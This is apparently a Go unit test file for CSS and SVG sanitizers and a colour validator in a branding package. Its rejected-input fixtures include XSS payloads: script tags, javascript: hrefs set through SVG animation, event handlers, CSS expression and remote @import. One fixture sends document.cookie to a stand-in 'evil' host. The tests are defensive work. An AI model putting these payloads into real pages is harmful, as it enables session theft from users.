package branding

import (
	"strings"
	"testing"
)

func TestSanitizeCSS(t *testing.T) {
	in := `@import url("https://evil/x.css"); .a{background:url(https://evil/i.png)} .b{color:red;behavior:url(x.htc)} .c{width:expression(1)} .d{background:url(/local.png)}`
	out, removed := SanitizeCSS(in)
	for _, bad := range []string{"@import", "https://evil", "behavior", "expression("} {
		if strings.Contains(out, bad) {
			t.Errorf("still contains %q: %s", bad, out)
		}
	}
	if !strings.Contains(out, "url(/local.png)") || !strings.Contains(out, "color:red") {
		t.Errorf("safe css lost: %s", out)
	}
	if len(removed) < 4 {
		t.Errorf("removed list too short: %v", removed)
	}
}

func TestSanitizeSVG(t *testing.T) {
	if _, err := SanitizeSVG([]byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>`)); err == nil {
		t.Error("script accepted")
	}
	if _, err := SanitizeSVG([]byte(`<svg xmlns="http://www.w3.org/2000/svg"><a href="https://x"><rect/></a></svg>`)); err == nil {
		t.Error("external href accepted")
	}
	if _, err := SanitizeSVG([]byte(`<svg xmlns="http://www.w3.org/2000/svg"><rect onload="x()"/></svg>`)); err == nil {
		t.Error("handler accepted")
	}
	if _, err := SanitizeSVG([]byte(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#0af"/></svg>`)); err != nil {
		t.Errorf("clean svg rejected: %v", err)
	}
}

func TestSanitizeSVGCDATAAndAnimation(t *testing.T) {
	bad := map[string]string{
		"cdata script":     `<svg xmlns="http://www.w3.org/2000/svg"><![CDATA[<script>fetch('//evil/'+document.cookie)</script>]]></svg>`,
		"cdata in title":   `<svg xmlns="http://www.w3.org/2000/svg"><title><![CDATA[<script>alert(1)</script>]]></title></svg>`,
		"comment script":   `<svg xmlns="http://www.w3.org/2000/svg"><!-- <script>alert(1)</script> --></svg>`,
		"set href":         `<svg xmlns="http://www.w3.org/2000/svg"><a><set attributeName="href" to="javascript:alert(1)"/></a></svg>`,
		"animate href":     `<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="xlink:href" to="javascript:alert(1)"/></a></svg>`,
		"xlink href":       `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="https://evil/"><rect/></a></svg>`,
		"foreign object":   `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">x</body></foreignObject></svg>`,
		"uppercase script": `<svg xmlns="http://www.w3.org/2000/svg"><SCRIPT>alert(1)</SCRIPT></svg>`,
	}
	for name, in := range bad {
		if _, err := SanitizeSVG([]byte(in)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	good := map[string]string{
		"fragment href":   `<svg xmlns="http://www.w3.org/2000/svg"><a href="#top"><rect/></a></svg>`,
		"safe animate":    `<svg xmlns="http://www.w3.org/2000/svg"><rect><animate attributeName="opacity" to="0"/></rect></svg>`,
		"cdata style":     `<svg xmlns="http://www.w3.org/2000/svg"><style><![CDATA[rect{fill:red}]]></style><rect/></svg>`,
		"xml declaration": `<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>`,
	}
	for name, in := range good {
		if _, err := SanitizeSVG([]byte(in)); err != nil {
			t.Errorf("%s: rejected: %v", name, err)
		}
	}
}

func TestValidateColor(t *testing.T) {
	for _, ok := range []string{"#fff", "#3b82f6", "#ABCDEF"} {
		if !ValidateColor(ok) {
			t.Errorf("%s rejected", ok)
		}
	}
	for _, bad := range []string{"red", "#ggg", "#12345", "url(x)"} {
		if ValidateColor(bad) {
			t.Errorf("%s accepted", bad)
		}
	}
}
